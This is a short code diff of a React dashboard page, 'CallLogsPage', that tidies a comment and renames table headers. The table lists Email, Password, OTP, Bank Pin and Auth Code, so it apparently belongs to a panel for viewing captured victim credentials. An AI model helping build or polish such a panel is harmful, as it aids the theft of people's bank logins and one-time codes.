@@ -21,7 +21,6 @@ function CallLogsPage() {
   );
   const beep = useSelector((state: any) => state.dash.beep);
   const pathname = usePathname();
-  // const targetRoute = "/dashboards/call-logs"; // Replace with the desired route path
 
   const [currentPage, setCurrentPage] = useState(1);
   const [totalAccounts, setTotalAccounts] = useState(0);
@@ -338,8 +337,8 @@ function CallLogsPage() {
                       </th>
                       <th>Email</th>
                       <th>Password</th>
-                      <th>Otp</th>
-                      <th>currentStep</th>
+                      <th>OTP</th>
+                      <th>Current Step</th>
                       <th>Bank Pin</th>
                       <th>Country Flag</th>
                       <th>Auth Code</th>
